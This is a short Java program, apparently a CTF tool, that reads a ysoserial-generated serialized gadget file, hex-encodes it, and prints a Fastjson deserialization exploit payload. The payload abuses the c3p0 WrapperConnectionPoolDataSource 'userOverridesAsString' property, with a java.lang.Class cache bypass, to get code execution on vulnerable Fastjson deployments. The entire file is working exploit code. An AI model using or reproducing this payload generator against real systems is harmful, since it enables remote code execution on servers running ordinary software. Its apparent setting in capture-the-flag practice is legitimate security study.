package fj;

import com.alibaba.fastjson.JSON;
import com.mchange.lang.ByteUtils;
import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;

import java.io.*;
import java.util.Arrays;

public class hexencode {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        InputStream in = new FileInputStream("D:\\CTF-tool\\java_unserialize\\calc.ser");      //yso生成对应链子
        byte[] data = toByteArray(in);
        in.close();
        String HexString = bytesToHexString(data, data.length);
        System.out.println(HexString);
        String poc ="{\"e\":{\"@type\":\"java.lang.Class\",\"val\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"},\"f\":{\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\"userOverridesAsString\":\"HexAsciiSerializedMap:"+HexString+";\"}}";
        System.out.println(poc);

    }

    public static byte[] toByteArray(InputStream in) throws IOException {
        byte[] classBytes;
        classBytes = new byte[in.available()];
        in.read(classBytes);
        in.close();
        return classBytes;
    }

    public static String bytesToHexString(byte[] bArray, int length) {
        StringBuffer sb = new StringBuffer(length);

        for(int i = 0; i < length; ++i) {
            String sTemp = Integer.toHexString(255 & bArray[i]);
            if (sTemp.length() < 2) {
                sb.append(0);
            }

            sb.append(sTemp.toUpperCase());
        }
        return sb.toString();
    }
}
